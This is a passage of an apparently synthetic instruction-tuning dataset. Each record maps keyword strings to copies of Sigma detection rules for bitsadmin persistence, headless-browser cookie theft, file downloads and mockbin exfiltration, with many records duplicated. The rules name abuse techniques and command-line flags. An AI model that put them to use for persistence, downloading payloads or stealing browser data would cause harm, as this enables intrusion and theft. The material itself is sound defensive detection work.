selection_cli_notify_2:\n        CommandLine|contains:\n            - '%COMSPEC%'\n            - 'cmd.exe'\n            - 'regsvr32.exe'\n    selection_cli_add_1:\n        CommandLine|contains: '/Addfile'\n    selection_cli_add_2:\n        CommandLine|contains:\n            - 'http:'\n            - 'https:'\n            - 'ftp:'\n            - 'ftps:'\n    condition: selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /SetNotifyCmdLine %COMSPEC% cmd.exe regsvr32.exe -addfile http: https: ftp: ftps:", "output": "title: Monitoring For Persistence Via BITS\nid: b9cbbc17-d00d-4e3d-a827-b06d03d2380d\nstatus: test\ndescription: |\n    BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\n    When the job runs on the system the command specified in the BITS job will be executed.\n    This can be abused by actors to create a backdoor within the system and for persistence.\n    It will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\n    - http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html\n    - https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394\nauthor: Sreeman\ndate: 2020-10-29\nmodified: 2024-01-25\ntags:\n    - attack.defense-evasion\n    - attack.t1197\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cli_notify_1:\n        CommandLine|contains: '/SetNotifyCmdLine'\n    selection_cli_notify_2:\n        CommandLine|contains:\n            - '%COMSPEC%'\n            - 'cmd.exe'\n            - 'regsvr32.exe'\n    selection_cli_add_1:\n        CommandLine|contains: '/Addfile'\n    selection_cli_add_2:\n        CommandLine|contains:\n            - 'http:'\n            - 'https:'\n            - 'ftp:'\n            - 'ftps:'\n    condition: selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin bitsadmin /SetNotifyCmdLine %COMSPEC% cmd regsvr32 /Addfile http: https: ftp: ftps:", "output": "title: Monitoring For Persistence Via BITS\nid: b9cbbc17-d00d-4e3d-a827-b06d03d2380d\nstatus: test\ndescription: |\n    BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\n    When the job runs on the system the command specified in the BITS job will be executed.\n    This can be abused by actors to create a backdoor within the system and for persistence.\n    It will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\n    - http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html\n    - https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394\nauthor: Sreeman\ndate: 2020-10-29\nmodified: 2024-01-25\ntags:\n    - attack.defense-evasion\n    - attack.t1197\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cli_notify_1:\n        CommandLine|contains: '/SetNotifyCmdLine'\n    selection_cli_notify_2:\n        CommandLine|contains:\n            - '%COMSPEC%'\n            - 'cmd.exe'\n            - 'regsvr32.exe'\n    selection_cli_add_1:\n        CommandLine|contains: '/Addfile'\n    selection_cli_add_2:\n        CommandLine|contains:\n            - 'http:'\n            - 'https:'\n            - 'ftp:'\n            - 'ftps:'\n    condition: selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bitsadmin.exe bitsadmin.exe /SetNotifyCmdLine %COMSPEC% cmd.exe regsvr32.exe /Addfile http: https: ftp: ftps:", "output": "title: Monitoring For Persistence Via BITS\nid: b9cbbc17-d00d-4e3d-a827-b06d03d2380d\nstatus: test\ndescription: |\n    BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\n    When the job runs on the system the command specified in the BITS job will be executed.\n    This can be abused by actors to create a backdoor within the system and for persistence.\n    It will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\n    - http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html\n    - https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394\nauthor: Sreeman\ndate: 2020-10-29\nmodified: 2024-01-25\ntags:\n    - attack.defense-evasion\n    - attack.t1197\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_cli_notify_1:\n        CommandLine|contains: '/SetNotifyCmdLine'\n    selection_cli_notify_2:\n        CommandLine|contains:\n            - '%COMSPEC%'\n            - 'cmd.exe'\n            - 'regsvr32.exe'\n    selection_cli_add_1:\n        CommandLine|contains: '/Addfile'\n    selection_cli_add_2:\n        CommandLine|contains:\n            - 'http:'\n            - 'https:'\n            - 'ftp:'\n            - 'ftps:'\n    condition: selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--remote-debugging- --user-data-dir --headless", "output": "title: Potential Data Stealing Via Chromium Headless Debugging\nid: 3e8207c5-fcd2-4ea6-9418-15d45b4890e4\nrelated:\n    - id: b3d34dc5-2efd-4ae3-845f-8ec14921f449\n      type: derived\nstatus: test\ndescription: Detects chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control\nreferences:\n    - https://github.com/defaultnamehere/cookie_crimes/\n    - https://mango.pdf.zone/stealing-chrome-cookies-without-a-password\n    - https://embracethered.com/blog/posts/2020/cookie-crimes-on-mirosoft-edge/\n    - https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-23\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1185\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '--remote-debugging-' # Covers: --remote-debugging-address, --remote-debugging-port, --remote-debugging-socket-name, --remote-debugging-pipe....etc\n            - '--user-data-dir'\n            - '--headless'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--remote-debugging- --user-data-dir --hea\"dless\"", "output": "title: Potential Data Stealing Via Chromium Headless Debugging\nid: 3e8207c5-fcd2-4ea6-9418-15d45b4890e4\nrelated:\n    - id: b3d34dc5-2efd-4ae3-845f-8ec14921f449\n      type: derived\nstatus: test\ndescription: Detects chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control\nreferences:\n    - https://github.com/defaultnamehere/cookie_crimes/\n    - https://mango.pdf.zone/stealing-chrome-cookies-without-a-password\n    - https://embracethered.com/blog/posts/2020/cookie-crimes-on-mirosoft-edge/\n    - https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-23\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1185\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '--remote-debugging-' # Covers: --remote-debugging-address, --remote-debugging-port, --remote-debugging-socket-name, --remote-debugging-pipe....etc\n            - '--user-data-dir'\n            - '--headless'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--remote-debugging- --user-data-dir --headless", "output": "title: Potential Data Stealing Via Chromium Headless Debugging\nid: 3e8207c5-fcd2-4ea6-9418-15d45b4890e4\nrelated:\n    - id: b3d34dc5-2efd-4ae3-845f-8ec14921f449\n      type: derived\nstatus: test\ndescription: Detects chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control\nreferences:\n    - https://github.com/defaultnamehere/cookie_crimes/\n    - https://mango.pdf.zone/stealing-chrome-cookies-without-a-password\n    - https://embracethered.com/blog/posts/2020/cookie-crimes-on-mirosoft-edge/\n    - https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-23\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1185\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '--remote-debugging-' # Covers: --remote-debugging-address, --remote-debugging-port, --remote-debugging-socket-name, --remote-debugging-pipe....etc\n            - '--user-data-dir'\n            - '--headless'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\msedge.exe \\opera.exe \\vivaldi.exe --headless", "output": "title: Browser Execution In Headless Mode\nid: ef9dcfed-690c-4c5d-a9d1-482cd422225c\nrelated:\n    - id: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\n      type: derived\nstatus: test\ndescription: Detects execution of Chromium based browser in headless mode\nreferences:\n    - https://twitter.com/mrd0x/status/1478234484881436672?s=12\n    - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-12\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n        CommandLine|contains: '--headless'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \"\\chrome.exe\" \"\\msedge.exe\" \\opera.exe \\vivaldi.exe --headless", "output": "title: Browser Execution In Headless Mode\nid: ef9dcfed-690c-4c5d-a9d1-482cd422225c\nrelated:\n    - id: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\n      type: derived\nstatus: test\ndescription: Detects execution of Chromium based browser in headless mode\nreferences:\n    - https://twitter.com/mrd0x/status/1478234484881436672?s=12\n    - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-12\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n        CommandLine|contains: '--headless'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave \\chrome \\msedge \\opera \\vivaldi --headless", "output": "title: Browser Execution In Headless Mode\nid: ef9dcfed-690c-4c5d-a9d1-482cd422225c\nrelated:\n    - id: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\n      type: derived\nstatus: test\ndescription: Detects execution of Chromium based browser in headless mode\nreferences:\n    - https://twitter.com/mrd0x/status/1478234484881436672?s=12\n    - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-12\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n        CommandLine|contains: '--headless'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\opera.exe \\chrome.exe \\msedge.exe \\vivaldi.exe --headless", "output": "title: Browser Execution In Headless Mode\nid: ef9dcfed-690c-4c5d-a9d1-482cd422225c\nrelated:\n    - id: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\n      type: derived\nstatus: test\ndescription: Detects execution of Chromium based browser in headless mode\nreferences:\n    - https://twitter.com/mrd0x/status/1478234484881436672?s=12\n    - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-12\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n        CommandLine|contains: '--headless'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\msedge.exe \\opera.exe \\vivaldi.exe --headless dump-dom http", "output": "title: File Download with Headless Browser\nid: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\nrelated:\n    - id: ef9dcfed-690c-4c5d-a9d1-482cd422225c\n      type: derived\nstatus: test\ndescription: Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files\nreferences:\n    - https://twitter.com/mrd0x/status/1478234484881436672?s=12\n    - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html\nauthor: Sreeman, Florian Roth (Nextron Systems)\ndate: 2022-01-04\nmodified: 2023-05-12\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n        CommandLine|contains|all:\n            - '--headless'\n            - 'dump-dom'\n            - 'http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\msedge.exe \\opera.exe \\vivaldi.exe \"--headless\" \"dump-dom\" http", "output": "title: File Download with Headless Browser\nid: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\nrelated:\n    - id: ef9dcfed-690c-4c5d-a9d1-482cd422225c\n      type: derived\nstatus: test\ndescription: Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files\nreferences:\n    - https://twitter.com/mrd0x/status/1478234484881436672?s=12\n    - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html\nauthor: Sreeman, Florian Roth (Nextron Systems)\ndate: 2022-01-04\nmodified: 2023-05-12\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n        CommandLine|contains|all:\n            - '--headless'\n            - 'dump-dom'\n            - 'http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave \\chrome \\msedge \\opera \\vivaldi --headless dump-dom http", "output": "title: File Download with Headless Browser\nid: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\nrelated:\n    - id: ef9dcfed-690c-4c5d-a9d1-482cd422225c\n      type: derived\nstatus: test\ndescription: Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files\nreferences:\n    - https://twitter.com/mrd0x/status/1478234484881436672?s=12\n    - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html\nauthor: Sreeman, Florian Roth (Nextron Systems)\ndate: 2022-01-04\nmodified: 2023-05-12\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n        CommandLine|contains|all:\n            - '--headless'\n            - 'dump-dom'\n            - 'http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\msedge.exe \\opera.exe \\vivaldi.exe --headless dump-dom http", "output": "title: File Download with Headless Browser\nid: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\nrelated:\n    - id: ef9dcfed-690c-4c5d-a9d1-482cd422225c\n      type: derived\nstatus: test\ndescription: Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files\nreferences:\n    - https://twitter.com/mrd0x/status/1478234484881436672?s=12\n    - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html\nauthor: Sreeman, Florian Roth (Nextron Systems)\ndate: 2022-01-04\nmodified: 2023-05-12\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n        CommandLine|contains|all:\n            - '--headless'\n            - 'dump-dom'\n            - 'http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\msedge.exe \\opera.exe \\vivaldi.exe --headless ://run.mocky ://mockbin", "output": "title: Chromium Browser Headless Execution To Mockbin Like Site\nid: 1c526788-0abe-4713-862f-b520da5e5316\nstatus: test\ndescription: Detects the execution of a Chromium based browser process with the \"headless\" flag and a URL pointing to the mockbin.org service (which can be used to exfiltrate data).\nreferences:\n    - https://www.zscaler.com/blogs/security-research/steal-it-campaign\nauthor: X__Junior (Nextron Systems)\ndate: 2023-09-11\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n    selection_headless:\n        CommandLine|contains: '--headless'\n    selection_url:\n        CommandLine|contains:\n            - '://run.mocky'\n            - '://mockbin'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\msedge.exe \\opera.exe \\vivaldi.exe --hea\"dless\" ://run.mocky ://mockbin", "output": "title: Chromium Browser Headless Execution To Mockbin Like Site\nid: 1c526788-0abe-4713-862f-b520da5e5316\nstatus: test\ndescription: Detects the execution of a Chromium based browser process with the \"headless\" flag and a URL pointing to the mockbin.org service (which can be used to exfiltrate data).\nreferences:\n    - https://www.zscaler.com/blogs/security-research/steal-it-campaign\nauthor: X__Junior (Nextron Systems)\ndate: 2023-09-11\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n    selection_headless:\n        CommandLine|contains: '--headless'\n    selection_url:\n        CommandLine|contains:\n            - '://run.mocky'\n            - '://mockbin'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave \\chrome \\msedge \\opera \\vivaldi --headless ://run.mocky ://mockbin", "output": "title: Chromium Browser Headless Execution To Mockbin Like Site\nid: 1c526788-0abe-4713-862f-b520da5e5316\nstatus: test\ndescription: Detects the execution of a Chromium based browser process with the \"headless\" flag and a URL pointing to the mockbin.org service (which can be used to exfiltrate data).\nreferences:\n    - https://www.zscaler.com/blogs/security-research/steal-it-campaign\nauthor: X__Junior (Nextron Systems)\ndate: 2023-09-11\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n    selection_headless:\n        CommandLine|contains: '--headless'\n    selection_url:\n        CommandLine|contains:\n            - '://run.mocky'\n            - '://mockbin'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\msedge.exe \\opera.exe \\vivaldi.exe --headless ://run.mocky ://mockbin", "output": "title: Chromium Browser Headless Execution To Mockbin Like Site\nid: 1c526788-0abe-4713-862f-b520da5e5316\nstatus: test\ndescription: Detects the execution of a Chromium based browser process with the \"headless\" flag and a URL pointing to the mockbin.org service (which can be used to exfiltrate data).\nreferences:\n    - https://www.zscaler.com/blogs/security-research/steal-it-campaign\nauthor: X__Junior (Nextron Systems)\ndate: 2023-09-11\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n    selection_headless:\n        CommandLine|contains: '--headless'\n    selection_url:\n        CommandLine|contains:\n            - '://run.mocky'\n            - '://mockbin'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\msedge.exe \\opera.exe \\vivaldi.exe http", "output": "title: File Download From Browser Process Via Inline URL\nid: 94771a71-ba41-4b6e-a757-b531372eaab6\nstatus: test\ndescription: Detects execution of a browser process with a URL argument pointing to a file with a potentially interesting extension. This can be abused to download arbitrary files or to hide from the user for example by launching the browser in a minimized state.\nreferences:\n    - https://twitter.com/mrd0x/status/1478116126005641220\n    - https://lolbas-project.github.io/lolbas/Binaries/Msedge/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-11-09\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_extensions:\n        CommandLine|endswith:\n            - '.7z'\n            - '.dat'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.ps1'\n            - '.psm1'\n            - '.txt'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\chrome.exe \\msedge.exe \\opera.exe \\vivaldi.exe \"h\"\"t\"\"t\"\"p\"", "output": "title: File Download From Browser Process Via Inline URL\nid: 94771a71-ba41-4b6e-a757-b531372eaab6\nstatus: test\ndescription: Detects execution of a browser process with a URL argument pointing to a file with a potentially interesting extension. This can be abused to download arbitrary files or to hide from the user for example by launching the browser in a minimized state.\nreferences:\n    - https://twitter.com/mrd0x/status/1478116126005641220\n    - https://lolbas-project.github.io/lolbas/Binaries/Msedge/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-11-09\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_extensions:\n        CommandLine|endswith:\n            - '.7z'\n            - '.dat'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.ps1'\n            - '.psm1'\n            - '.txt'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave \\chrome \\msedge \\opera \\vivaldi http", "output": "title: File Download From Browser Process Via Inline URL\nid: 94771a71-ba41-4b6e-a757-b531372eaab6\nstatus: test\ndescription: Detects execution of a browser process with a URL argument pointing to a file with a potentially interesting extension. This can be abused to download arbitrary files or to hide from the user for example by launching the browser in a minimized state.\nreferences:\n    - https://twitter.com/mrd0x/status/1478116126005641220\n    - https://lolbas-project.github.io/lolbas/Binaries/Msedge/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-11-09\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_extensions:\n        CommandLine|endswith:\n            - '.7z'\n            - '.dat'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.ps1'\n            - '.psm1'\n            - '.txt'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\brave.exe \\opera.exe \\msedge.exe http \\chrome.exe \\vivaldi.exe", "output": "title: File Download From Browser Process Via Inline URL\nid: 94771a71-ba41-4b6e-a757-b531372eaab6\nstatus: test\ndescription: Detects execution of a browser process with a URL argument pointing to a file with a potentially interesting extension. This can be abused to download arbitrary files or to hide from the user for example by launching the browser in a minimized state.\nreferences:\n    - https://twitter.com/mrd0x/status/1478116126005641220\n    - https://lolbas-project.github.io/lolbas/Binaries/Msedge/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-11-09\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_extensions:\n        CommandLine|endswith:\n            - '.7z'\n            - '.dat'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.ps1'\n            - '.psm1'\n            - '.txt'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--remote-debugging- \\firefox.exe -start-debugger-server", "output": "title: Browser Started with Remote Debugging\nid: b3d34dc5-2efd-4ae3-845f-8ec14921f449\nrelated:\n    - id: 3e8207c5-fcd2-4ea6-9418-15d45b4890e4\n      type: derived\nstatus: test\ndescription: Detects browsers starting with the remote debugging flags. Which is a technique often used to perform browser injection attacks\nreferences:\n    - https://yoroi.company/wp-content/uploads/2022/05/EternityGroup_report_compressed.pdf\n    - https://www.mdsec.co.uk/2022/10/analysing-lastpass-part-1/\n    - https://github.com/defaultnamehere/cookie_crimes/\n    - https://github.com/wunderwuzzi23/firefox-cookiemonster\nauthor: pH-T (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-27\nmodified: 2022-12-23\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1185\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_chromium_based:\n        # Covers: --remote-debugging-address, --remote-debugging-port, --remote-debugging-socket-name, --remote-debugging-pipe....etc\n        CommandLine|contains: ' --remote-debugging-'\n    selection_firefox:\n        Image|endswith: '\\firefox.exe'\n        CommandLine|contains: ' -start-debugger-server'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--remote-debugging- \\\"\\firefox.exe\\\" -start-debugger-server", "output": "title: Browser Started with Remote Debugging\nid: b3d34dc5-2efd-4ae3-845f-8ec14921f449\nrelated:\n    - id: 3e8207c5-fcd2-4ea6-9418-15d45b4890e4\n      type: derived\nstatus: test\ndescription: Detects browsers starting with the remote debugging flags. Which is a technique often used to perform browser injection attacks\nreferences:\n    - https://yoroi.company/wp-content/uploads/2022/05/EternityGroup_report_compressed.pdf\n    - https://www.mdsec.co.uk/2022/10/analysing-lastpass-part-1/\n    - https://github.com/defaultnamehere/cookie_crimes/\n    - https://github.com/wunderwuzzi23/firefox-cookiemonster\nauthor: pH-T (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-27\nmodified: 2022-12-23\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1185\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_chromium_based:\n        # Covers: --remote-debugging-address, --remote-debugging-port, --remote-debugging-socket-name, 